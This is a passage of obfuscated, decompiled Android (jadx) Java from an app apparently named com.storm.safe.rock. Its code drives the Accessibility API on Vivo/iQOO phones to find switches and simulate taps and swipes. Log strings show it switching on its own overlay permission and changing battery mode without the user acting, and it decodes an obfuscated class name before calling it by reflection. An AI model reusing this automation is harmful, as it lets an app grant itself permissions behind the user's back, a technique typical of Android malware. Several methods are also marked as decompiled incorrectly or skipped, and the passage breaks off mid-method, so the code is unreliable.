        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Not initialized variable reg: 14, insn: 0x0066: MOVE (r5 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) = (r14 I:??[int, float, boolean, short, byte, char, OBJECT, ARRAY]) (LINE:103), block:B:22:0x0065 */
    /* JADX WARN: Not initialized variable reg: 15, insn: 0x0067: MOVE (r14 I:??[OBJECT, ARRAY]) = (r15 I:??[OBJECT, ARRAY]) (LINE:104), block:B:22:0x0065 */
    /* JADX WARN: Path cross not found for [B:168:0x015c, B:77:0x0177], limit reached: 205 */
    /* JADX WARN: Removed duplicated region for block: B:166:0x0122 A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:189:0x020f A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001c  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0180 A[Catch: Exception -> 0x01ba, TRY_LEAVE, TryCatch #5 {Exception -> 0x01ba, blocks: (B:65:0x014c, B:67:0x0156, B:78:0x017a, B:80:0x0180), top: B:176:0x014c }] */
    /* JADX WARN: Type inference failed for: r0v11 */
    /* JADX WARN: Type inference failed for: r0v54 */
    /* JADX WARN: Type inference failed for: r0v6 */
    /* JADX WARN: Type inference failed for: r5v30, types: [int] */
    /* JADX WARN: Type inference failed for: r7v1, types: [int] */
    /* JADX WARN: Type inference failed for: r7v24 */
    /* JADX WARN: Type inference failed for: r7v5 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:156:0x02f7 -> B:158:0x02fa). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:181:0x02f3 -> B:160:0x0304). Please report as a decompilation issue!!! */
    /* renamed from: a2 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static final java.lang.Object m212373a2(com.storm.safe.rock.service.modules.yw5xud.C0371a8 r22, kotlin.coroutines.jvm.internal.ContinuationImpl r23) throws java.lang.Throwable {
        /*
            Method dump skipped, instructions count: 828
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.storm.safe.rock.service.modules.yw5xud.C0371a8.m212373a2(com.storm.safe.rock.service.modules.yw5xud.a8, kotlin.coroutines.jvm.internal.ContinuationImpl):java.lang.Object");
    }

    /* renamed from: b2 */
    public static int m212374b2(AccessibilityNodeInfo accessibilityNodeInfo) {
        int childCount = accessibilityNodeInfo.getChildCount();
        int i = 1;
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null) {
                int iM212374b2 = m212374b2(child) + i;
                child.recycle();
                i = iM212374b2;
            }
        }
        return i;
    }

    /* renamed from: d0 */
    public static AccessibilityNodeInfo m212375d0(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "ToggleButton", false)) && accessibilityNodeInfo.isChecked() && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212375d0 = m212375d0(child);
                if (accessibilityNodeInfoM212375d0 != null) {
                    if (!accessibilityNodeInfoM212375d0.equals(child)) {
                        child.recycle();
                    }
                    return accessibilityNodeInfoM212375d0;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: d1 */
    public static AccessibilityNodeInfo m212376d1(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if ((AbstractC0779a1.m213652a5(string, "Switch", false) || AbstractC0779a1.m213652a5(string, "CheckBox", false) || AbstractC0779a1.m213652a5(string, "ToggleButton", false)) && !accessibilityNodeInfo.isChecked() && accessibilityNodeInfo.isVisibleToUser()) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo accessibilityNodeInfoM212376d1 = m212376d1(child);
                if (accessibilityNodeInfoM212376d1 != null) {
                    if (!accessibilityNodeInfoM212376d1.equals(child)) {
                        child.recycle();
                    }
                    return accessibilityNodeInfoM212376d1;
                }
                child.recycle();
            }
        }
        return null;
    }

    /* renamed from: d2 */
    public static AccessibilityNodeInfo m212377d2(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212377d2;
        if (i > 15) {
            return null;
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription == null || (string = contentDescription.toString()) == null) {
            string = "";
        }
        if (AbstractC0779a1.m213652a5(string, "均衡模式", false)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
            if (child != null && (accessibilityNodeInfoM212377d2 = m212377d2(child, i + 1)) != null) {
                return accessibilityNodeInfoM212377d2;
            }
        }
        return null;
    }

    /* renamed from: d3 */
    public static final void m212378d3(Rect rect, ArrayList arrayList, AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        boolean z = AbstractC0779a1.m213652a5(string, "ImageView", true) || AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true);
        boolean z2 = rectM24a5.left > rect.right + (-50);
        boolean z3 = rectM24a5.top < rect.bottom + 80 && rectM24a5.bottom > rect.top + (-80);
        if (z && z2 && z3 && rectM24a5.width() > 20 && rectM24a5.height() > 20) {
            arrayList.add(new Pair(accessibilityNodeInfo, rectM24a5));
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                m212378d3(rect, arrayList, child);
            }
        }
    }

    /* renamed from: d4 */
    public static AccessibilityNodeInfo m212379d4(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212379d4;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (string.equals("android.widget.ListView") || string.equals("androidx.recyclerview.widget.RecyclerView") || string.equals("android.widget.ScrollView")) {
            return accessibilityNodeInfo;
        }
        if (AbstractC0779a1.m213652a5(string, "RecyclerView", false) || AbstractC0779a1.m213652a5(string, "ListView", false) || AbstractC0779a1.m213652a5(string, "ScrollView", false)) {
            return accessibilityNodeInfo;
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null && (accessibilityNodeInfoM212379d4 = m212379d4(child)) != null) {
                return accessibilityNodeInfoM212379d4;
            }
        }
        return null;
    }

    /* renamed from: d5 */
    public static AccessibilityNodeInfo m212380d5(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        String string3;
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        if (parent == null) {
            return null;
        }
        int childCount = parent.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = parent.getChild(i);
            if (child != null) {
                CharSequence className = child.getClassName();
                if (className == null || (string = className.toString()) == null) {
                    string = "";
                }
                if (child.isEnabled() && string.equals("android.widget.Switch")) {
                    return child;
                }
                int childCount2 = child.getChildCount();
                for (int i2 = 0; i2 < childCount2; i2++) {
                    AccessibilityNodeInfo child2 = child.getChild(i2);
                    if (child2 != null) {
                        CharSequence className2 = child2.getClassName();
                        if (className2 == null || (string2 = className2.toString()) == null) {
                            string2 = "";
                        }
                        if (child2.isEnabled() && string2.equals("android.widget.Switch")) {
                            return child2;
                        }
                        int childCount3 = child2.getChildCount();
                        for (int i3 = 0; i3 < childCount3; i3++) {
                            AccessibilityNodeInfo child3 = child2.getChild(i3);
                            if (child3 != null) {
                                CharSequence className3 = child3.getClassName();
                                if (className3 == null || (string3 = className3.toString()) == null) {
                                    string3 = "";
                                }
                                if (child3.isEnabled() && string3.equals("android.widget.Switch")) {
                                    return child3;
                                }
                            }
                        }
                    }
                }
            }
        }
        return null;
    }

    /* renamed from: d6 */
    public static final void m212381d6(int i, int i2, AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        boolean z = Math.abs(rectM24a5.centerY() - i) <= 80 && rectM24a5.centerX() > i2;
        if (z && rectM24a5.width() > 0) {
            rectM24a5.height();
        }
        if (accessibilityNodeInfo.isEnabled() && z && ((accessibilityNodeInfo.isCheckable() || accessibilityNodeInfo.isClickable() || AbstractC0779a1.m213652a5(string, "Switch", true) || AbstractC0779a1.m213652a5(string, "CheckBox", true) || AbstractC0779a1.m213652a5(string, "Toggle", true) || AbstractC0779a1.m213652a5(string, "Image", true) || AbstractC0779a1.m213652a5(string, "View", true)) && rectM24a5.width() > 0 && rectM24a5.height() > 0)) {
            arrayList.add(accessibilityNodeInfo);
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i3 = 0; i3 < childCount; i3++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i3);
            if (child != null) {
                m212381d6(i, i2, child, arrayList);
            }
        }
    }

    /* renamed from: d7 */
    public static AccessibilityNodeInfo m212382d7(AccessibilityNodeInfo accessibilityNodeInfo) {
        List listM213306g5 = AbstractC0716jf.m213306g5("android.widget.Switch", "android.widget.CheckBox", "android.widget.ToggleButton", "androidx.appcompat.widget.SwitchCompat", "android.widget.CompoundButton");
        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
        if (parent == null) {
            return null;
        }
        int childCount = parent.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = parent.getChild(i);
            if (child != null) {
                if (m212383d8(child, listM213306g5)) {
                    return child;
                }
                if (child.getChildCount() > 0) {
                    int childCount2 = child.getChildCount();
                    for (int i2 = 0; i2 < childCount2; i2++) {
                        AccessibilityNodeInfo child2 = child.getChild(i2);
                        if (child2 != null) {
                            if (m212383d8(child2, listM213306g5)) {
                                return child2;
                            }
                            if (child2.getChildCount() > 0) {
                                int childCount3 = child2.getChildCount();
                                for (int i3 = 0; i3 < childCount3; i3++) {
                                    AccessibilityNodeInfo child3 = child2.getChild(i3);
                                    if (child3 != null && m212383d8(child3, listM213306g5)) {
                                        return child3;
                                    }
                                }
                            } else {
                                continue;
                            }
                        }
                    }
                } else {
                    continue;
                }
            }
        }
        return null;
    }

    /* renamed from: d8 */
    public static final boolean m212383d8(AccessibilityNodeInfo accessibilityNodeInfo, List list) {
        String string;
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "";
        }
        if (accessibilityNodeInfo.isEnabled() && (list == null || !list.isEmpty())) {
            Iterator it = list.iterator();
            while (it.hasNext()) {
                if (string.equals((String) it.next())) {
                    return true;
                }
            }
        }
        return accessibilityNodeInfo.isEnabled() && accessibilityNodeInfo.isCheckable();
    }

    /* renamed from: e2 */
    public static String m212384e2(String str) throws IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        try {
            Object objInvoke = Class.forName(StringUtil.m212470a0("KlcVKEIxCGBYImVqCClZPQEeRT47XAMuRD0f")).getMethod("get", String.class).invoke(null, str);
            String str2 = objInvoke instanceof String ? (String) objInvoke : null;
            return str2 == null ? "" : str2;
        } catch (Exception unused) {
            return "";
        }
    }

    /* renamed from: g6 */
    public static /* synthetic */ Object m212385g6(C0371a8 c0371a8, ContinuationImpl continuationImpl) {
        return c0371a8.m212437g5(3, 50L, 1500L, continuationImpl);
    }

    /* JADX WARN: Removed duplicated region for block: B:64:0x00ff  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0102  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x0165 A[RETURN] */
    /* renamed from: a3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212386a3(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickAppAndEnableOverlay$1 vivoSteps$clickAppAndEnableOverlay$1;
        String string;
        C0371a8 c0371a8;
        C0371a8 c0371a82;
        Object objM212391a8;
        if (continuationImpl instanceof VivoSteps$clickAppAndEnableOverlay$1) {
            vivoSteps$clickAppAndEnableOverlay$1 = (VivoSteps$clickAppAndEnableOverlay$1) continuationImpl;
            int i = vivoSteps$clickAppAndEnableOverlay$1.f54745a3;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickAppAndEnableOverlay$1.f54745a3 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$clickAppAndEnableOverlay$1 = new VivoSteps$clickAppAndEnableOverlay$1(this, continuationImpl);
            }
        }
        Object obj = vivoSteps$clickAppAndEnableOverlay$1.f54743a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$clickAppAndEnableOverlay$1.f54745a3;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
            String str2 = this.f55141a2;
            if (rootInActiveWindow == null) {
                t60.m214704c5(str2, "[悬浮窗权限] ❌ getRootNode返回null");
                return Boolean.FALSE;
            }
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                if (!AbstractC0779a1.m213652a5(accessibilityNodeInfo.getClassName().toString(), "EditText", false)) {
                    CharSequence text = accessibilityNodeInfo.getText();
                    if (text == null || (string = text.toString()) == null) {
                        string = "";
                    }
                    if (!string.equals(str)) {
                        continue;
                    } else if (accessibilityNodeInfo.getParent() == null) {
                        t60.m214726f4(str2, "[悬浮窗权限] ⚠️ parent为null");
                    } else {
                        AccessibilityNodeInfo accessibilityNodeInfoM212380d5 = m212380d5(accessibilityNodeInfo);
                        if (accessibilityNodeInfoM212380d5 == null) {
                            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                            while (true) {
                                if (parent == null) {
                                    t60.m214726f4(str2, "[n] ❌ 未找到开关节点");
                                    accessibilityNodeInfoM212380d5 = null;
                                    break;
                                }
                                AccessibilityNodeInfo accessibilityNodeInfoM212380d52 = m212380d5(parent);
                                if (accessibilityNodeInfoM212380d52 != null) {
                                    accessibilityNodeInfoM212380d5 = accessibilityNodeInfoM212380d52;
                                    break;
                                }
                                parent = parent.getParent();
                            }
                        }
                        if (accessibilityNodeInfoM212380d5 == null) {
                            t60.m214726f4(str2, "[悬浮窗权限] ⚠️ 未找到开关节点，尝试点击应用名称");
                            m212422f0(accessibilityNodeInfo);
                            accessibilityNodeInfo.recycle();
                            Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                            while (it.hasNext()) {
                                ((AccessibilityNodeInfo) it.next()).recycle();
                            }
                            rootInActiveWindow.recycle();
                            vivoSteps$clickAppAndEnableOverlay$1.f54742a0 = this;
                            vivoSteps$clickAppAndEnableOverlay$1.f54745a3 = 2;
                            if (b81.m210571b1(100L, vivoSteps$clickAppAndEnableOverlay$1) != coroutineSingletons) {
                                c0371a8 = this;
                                vivoSteps$clickAppAndEnableOverlay$1.f54742a0 = null;
                                vivoSteps$clickAppAndEnableOverlay$1.f54745a3 = 3;
                                objM212391a8 = c0371a8.m212391a8(vivoSteps$clickAppAndEnableOverlay$1);
                                if (objM212391a8 == coroutineSingletons) {
                                }
                            }
                        } else {
                            if (accessibilityNodeInfoM212380d5.isChecked()) {
                                accessibilityNodeInfoM212380d5.recycle();
                                accessibilityNodeInfo.recycle();
                                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it2.hasNext()) {
                                    ((AccessibilityNodeInfo) it2.next()).recycle();
                                }
                                rootInActiveWindow.recycle();
                                return Boolean.TRUE;
                            }
                            m212422f0(accessibilityNodeInfoM212380d5);
                            accessibilityNodeInfoM212380d5.recycle();
                            accessibilityNodeInfo.recycle();
                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                            rootInActiveWindow.recycle();
                            vivoSteps$clickAppAndEnableOverlay$1.f54742a0 = this;
                            vivoSteps$clickAppAndEnableOverlay$1.f54745a3 = 1;
                            if (b81.m210571b1(100L, vivoSteps$clickAppAndEnableOverlay$1) != coroutineSingletons) {
                                c0371a82 = this;
                                if (!Settings.canDrawOverlays(c0371a82.f55140a1)) {
                                }
                            }
                        }
                    }
                }
            }
            t60.m214704c5(str2, "[悬浮窗权限] ❌ 未找到应用: " + str);
            Iterator<T> it4 = listFindAccessibilityNodeInfosByText.iterator();
            while (it4.hasNext()) {
                ((AccessibilityNodeInfo) it4.next()).recycle();
            }
            rootInActiveWindow.recycle();
            return Boolean.FALSE;
        }
        if (i2 == 1) {
            c0371a82 = vivoSteps$clickAppAndEnableOverlay$1.f54742a0;
            kg1.m213544f4(obj);
            if (!Settings.canDrawOverlays(c0371a82.f55140a1)) {
                return Boolean.TRUE;
            }
            t60.m214726f4(c0371a82.f55141a2, "[悬浮窗权限] ⚠️ 点击后权限仍未开启，继续检查");
            return Boolean.TRUE;
        }
        if (i2 != 2) {
            if (i2 != 3) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return obj;
        }
        c0371a8 = vivoSteps$clickAppAndEnableOverlay$1.f54742a0;
        kg1.m213544f4(obj);
        vivoSteps$clickAppAndEnableOverlay$1.f54742a0 = null;
        vivoSteps$clickAppAndEnableOverlay$1.f54745a3 = 3;
        objM212391a8 = c0371a8.m212391a8(vivoSteps$clickAppAndEnableOverlay$1);
        if (objM212391a8 == coroutineSingletons) {
            return objM212391a8;
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x0048  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0169  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:18:0x004e -> B:65:0x0166). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:56:0x00fa -> B:65:0x0166). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:63:0x0164 -> B:64:0x0165). Please report as a decompilation issue!!! */
    /* renamed from: a4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212387a4(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickAppRowToEnterDetail$1 vivoSteps$clickAppRowToEnterDetail$1;
        C0371a8 c0371a8;
        int i;
        C0371a8 c0371a82;
        String str2;
        String string;
        AccessibilityNodeInfo parent;
        String string2;
        AccessibilityNodeInfo parent2;
        if (continuationImpl instanceof VivoSteps$clickAppRowToEnterDetail$1) {
            vivoSteps$clickAppRowToEnterDetail$1 = (VivoSteps$clickAppRowToEnterDetail$1) continuationImpl;
            int i2 = vivoSteps$clickAppRowToEnterDetail$1.f54751a5;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickAppRowToEnterDetail$1.f54751a5 = i2 - Integer.MIN_VALUE;
                c0371a8 = this;
            } else {
                c0371a8 = this;
                vivoSteps$clickAppRowToEnterDetail$1 = new VivoSteps$clickAppRowToEnterDetail$1(c0371a8, continuationImpl);
            }
        }
        Object obj = vivoSteps$clickAppRowToEnterDetail$1.f54749a3;
        Object obj2 = CoroutineSingletons.f57606a0;
        int i3 = vivoSteps$clickAppRowToEnterDetail$1.f54751a5;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            i = 0;
            c0371a82 = c0371a8;
            str2 = str;
            if (i >= 21) {
            }
        } else {
            if (i3 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i = vivoSteps$clickAppRowToEnterDetail$1.f54748a2;
            String str3 = vivoSteps$clickAppRowToEnterDetail$1.f54747a1;
            c0371a82 = vivoSteps$clickAppRowToEnterDetail$1.f54746a0;
            kg1.m213544f4(obj);
            str2 = str3;
            i++;
            if (i >= 21) {
                return Boolean.FALSE;
            }
            AccessibilityNodeInfo rootInActiveWindow = c0371a82.f55139a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                Iterator it = AbstractC0716jf.m213306g5("com.vivo.abe:id/app_name", "com.iqoo.powersaving:id/title").iterator();
                while (it.hasNext()) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo : rootInActiveWindow.findAccessibilityNodeInfosByViewId((String) it.next())) {
                        CharSequence text = accessibilityNodeInfo.getText();
                        if (text != null && (string2 = text.toString()) != null && string2.equals(str2) && accessibilityNodeInfo.isVisibleToUser() && (parent2 = accessibilityNodeInfo.getParent()) != null) {
                            Rect rectM24a5 = AbstractC0003a2.m24a5(parent2);
                            c0371a82.m212424f2(rectM24a5.centerX(), rectM24a5.centerY());
                            return Boolean.TRUE;
                        }
                    }
                }
                for (AccessibilityNodeInfo accessibilityNodeInfo2 : rootInActiveWindow.findAccessibilityNodeInfosByText(str2)) {
                    CharSequence text2 = accessibilityNodeInfo2.getText();
                    if (text2 != null && (string = text2.toString()) != null && string.equals(str2) && accessibilityNodeInfo2.isVisibleToUser() && (parent = accessibilityNodeInfo2.getParent()) != null) {
                        Rect rectM24a52 = AbstractC0003a2.m24a5(parent);
                        c0371a82.m212424f2(rectM24a52.centerX(), rectM24a52.centerY());
                        return Boolean.TRUE;
                    }
                }
                if (i < 20) {
                    vivoSteps$clickAppRowToEnterDetail$1.f54746a0 = c0371a82;
                    vivoSteps$clickAppRowToEnterDetail$1.f54747a1 = str2;
                    vivoSteps$clickAppRowToEnterDetail$1.f54748a2 = i;
                    vivoSteps$clickAppRowToEnterDetail$1.f54751a5 = 1;
                    dqtvuisjd dqtvuisjdVar = c0371a82.f55139a0;
                    DisplayMetrics displayMetrics = dqtvuisjdVar.getResources().getDisplayMetrics();
                    int i4 = displayMetrics.widthPixels;
                    float f = displayMetrics.heightPixels;
                    float f2 = i4 / 2;
                    Path path = new Path();
                    path.moveTo(f2, 0.85f * f);
                    path.lineTo(f2, f * 0.25f);
                    GestureDescription gestureDescriptionBuild = new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(path, 100L, 500L)).build();
                    CountDownLatch countDownLatch = new CountDownLatch(1);
                    dqtvuisjdVar.dispatchGesture(gestureDescriptionBuild, new rl0(1, countDownLatch), null);
                    countDownLatch.await(1L, TimeUnit.SECONDS);
                    Object objM210571b1 = b81.m210571b1(300L, vivoSteps$clickAppRowToEnterDetail$1);
                    if (objM210571b1 != CoroutineSingletons.f57606a0) {
                        objM210571b1 = C1351vv.f60710b1;
                    }
                    if (objM210571b1 == obj2) {
                        return obj2;
                    }
                    str3 = str2;
                    str2 = str3;
                }
            }
            i++;
            if (i >= 21) {
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:130:0x02f5, code lost:
    
        r16 = r9;
        r10 = r11;
     */
    /* JADX WARN: Removed duplicated region for block: B:105:0x02fa  */
    /* JADX WARN: Removed duplicated region for block: B:33:0x011e  */
    /* JADX WARN: Removed duplicated region for block: B:37:0x012a  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0149  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0160  */
    /* JADX WARN: Removed duplicated region for block: B:54:0x01b0  */
    /* JADX WARN: Removed duplicated region for block: B:61:0x01cd  */
    /* JADX WARN: Removed duplicated region for block: B:62:0x01cf  */
    /* JADX WARN: Removed duplicated region for block: B:66:0x01f6  */
    /* JADX WARN: Removed duplicated region for block: B:74:0x024a  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x028f  */
    /* JADX WARN: Removed duplicated region for block: B:95:0x02cf  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:71:0x0216 -> B:72:0x0244). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:79:0x0285 -> B:80:0x0287). Please report as a decompilation issue!!! */
    /* renamed from: a5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212388a5(ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$clickBalancedMode$1 vivoSteps$clickBalancedMode$1;
        C0371a8 c0371a8;
        AccessibilityNodeInfo accessibilityNodeInfo;
        List<AccessibilityNodeInfo> list;
        C0371a8 c0371a82;
        AccessibilityNodeInfo accessibilityNodeInfoM212377d2;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        boolean zBooleanValue;
        Iterator<T> it;
        AccessibilityNodeInfo accessibilityNodeInfo3;
        Iterator it2;
        boolean zBooleanValue2;
        AccessibilityNodeInfo accessibilityNodeInfo4;
        String str;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        long j;
        Object obj;
        Iterator it3;
        Iterator<AccessibilityNodeInfo> it4;
        C0371a8 c0371a83;
        AccessibilityNodeInfo accessibilityNodeInfo5;
        AccessibilityNodeInfo accessibilityNodeInfo6;
        if (continuationImpl instanceof VivoSteps$clickBalancedMode$1) {
            vivoSteps$clickBalancedMode$1 = (VivoSteps$clickBalancedMode$1) continuationImpl;
            int i = vivoSteps$clickBalancedMode$1.f54760a8;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$clickBalancedMode$1.f54760a8 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$clickBalancedMode$1 = new VivoSteps$clickBalancedMode$1(this, continuationImpl);
            }
        }
        Object obj2 = vivoSteps$clickBalancedMode$1.f54758a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        long j2 = 500;
        Object obj3 = null;
        switch (vivoSteps$clickBalancedMode$1.f54760a8) {
            case 0:
                kg1.m213544f4(obj2);
                String str2 = this.f55141a2;
                t60.m214704c5(str2, "[电池] 🔋 ========== 开始点击'均衡'模式 ==========");
                AccessibilityNodeInfo rootInActiveWindow = this.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    t60.m214704c5(str2, "[电池] ❌ getRootNode() 返回 null");
                    return Boolean.FALSE;
                }
                t60.m214704c5(str2, "[电池] 🔍 方式1: 通过 resource-id 查找 battery_mode_view...");
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.iqoo.powersaving:id/battery_mode_view");
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    Rect rectM24a5 = AbstractC0003a2.m24a5(listFindAccessibilityNodeInfosByViewId.get(0));
                    t60.m214704c5(str2, "[电池] ✅ 找到 battery_mode_view: bounds=" + rectM24a5);
                    float fCenterX = (float) rectM24a5.centerX();
                    float fCenterY = (float) rectM24a5.centerY();
                    t60.m214704c5(str2, AbstractC0003a2.m29b0("[电池] 📍 点击滑块中间位置(均衡): (", fCenterX, ", ", fCenterY, ")"));
                    vivoSteps$clickBalancedMode$1.f54752a0 = this;
                    vivoSteps$clickBalancedMode$1.f54753a1 = rootInActiveWindow;
                    vivoSteps$clickBalancedMode$1.f54754a2 = listFindAccessibilityNodeInfosByViewId;
                    vivoSteps$clickBalancedMode$1.f54760a8 = 1;
                    Boolean boolM212423f1 = m212423f1(fCenterX, fCenterY);
                    if (boolM212423f1 != coroutineSingletons) {
                        accessibilityNodeInfo = rootInActiveWindow;
                        obj2 = boolM212423f1;
                        list = listFindAccessibilityNodeInfosByViewId;
                        c0371a82 = this;
                        zBooleanValue = ((Boolean) obj2).booleanValue();
                        t60.m214704c5(c0371a82.f55141a2, "[电池] 🖱️ 方式1 点击结果: " + zBooleanValue);
                        t60.m214694b5(list, "modeViewNodes");
                        it = list.iterator();
                        while (it.hasNext()) {
                            try {
                                ((AccessibilityNodeInfo) it.next()).recycle();
                            } catch (Exception unused) {
                            }
                        }
                        if (zBooleanValue) {
                            rootInActiveWindow = accessibilityNodeInfo;
                            c0371a8 = c0371a82;
                            String str3 = c0371a8.f55141a2;
                            t60.m214704c5(str3, "[电池] 🔍 方式2: 通过 contentDescription 查找'均衡模式'...");
                            accessibilityNodeInfoM212377d2 = m212377d2(rootInActiveWindow, 0);
